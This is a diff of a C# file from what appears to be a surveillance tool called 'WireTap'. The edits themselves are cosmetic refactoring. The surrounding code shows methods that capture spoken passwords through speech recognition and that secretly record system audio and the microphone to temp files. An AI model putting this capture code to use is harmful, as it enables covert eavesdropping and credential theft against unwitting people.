@@ -1,21 +1,20 @@
-﻿using System;
-using NAudio.Wave;
-using System.IO;
-using System.Threading;
+﻿using NAudio.Wave;
+using System;
 using System.Runtime.InteropServices;
-using System.Text;
-using NAudio.Wave.SampleProviders;
+
 //using Microsoft.Speech.Recognition;
 //using Microsoft.Speech.Synthesis;
 using System.Speech.Recognition;
+using System.Text;
+using System.Threading;
 
 namespace WireTap
 {
-    class Audio
+    internal class Audio
     {
-        static bool done = false;
-        static bool speechOn = true;
-        static bool recording = false;
+        private static bool done = false;
+        private static bool speechOn = true;
+        private static bool recording = false;
 
         // BEGIN MICROSOFT.SPEECH
 
@@ -62,10 +61,7 @@ namespace WireTap
         //    }
         //}
 
-
         // END MICROSOFT.SPEECH
-
-
 
         public static void ListenForPasswords(Choices ch = null)
         {
@@ -100,7 +96,7 @@ namespace WireTap
             }
             recognizer.UnloadAllGrammars();
         }
-        
+
         public static void RecordSystemAudio(string outFile, int msToRecord = 10000)
         {
             // Redefine the capturer instance with a new instance of the LoopbackCapture class
@@ -123,7 +119,7 @@ namespace WireTap
                 RecordedAudioWriter = null;
                 CaptureInstance.Dispose();
             };
-            
+
             // Start audio recording !
             CaptureInstance.StartRecording();
             Thread.Sleep(msToRecord);
@@ -131,7 +127,7 @@ namespace WireTap
         }
 
         [DllImport("winmm.dll")]
-        static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
+        private static extern Int32 mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
 
         public static void RecordMicrophone(string outFile, int msToRecord = 10000)
         {
@@ -148,7 +144,7 @@ namespace WireTap
             mciSendString("close " + guid, buf, 0, IntPtr.Zero);
         }
 
-        public static void RecordAudio(int msToRecord=10000)
+        public static void RecordAudio(int msToRecord = 10000)
         {
             Console.WriteLine("Recording audio...");
             string sysAudioFile = Helpers.CreateTempFileName(".wav", "sysAudio-");
@@ -158,7 +154,7 @@ namespace WireTap
             sysThread.Start();
             micThread.Start();
             Console.WriteLine("{0}: Audio recording initiated. Waiting until {1} seconds have elapsed.",
-                              Helpers.CurrentTime(), msToRecord/1000);
+                              Helpers.CurrentTime(), msToRecord / 1000);
             micThread.Join();
             Console.WriteLine("{0}: Audio recordings complete.", Helpers.CurrentTime());
             Console.WriteLine("\tSystem Sounds Recording File:\n\t\t{0}", sysAudioFile);
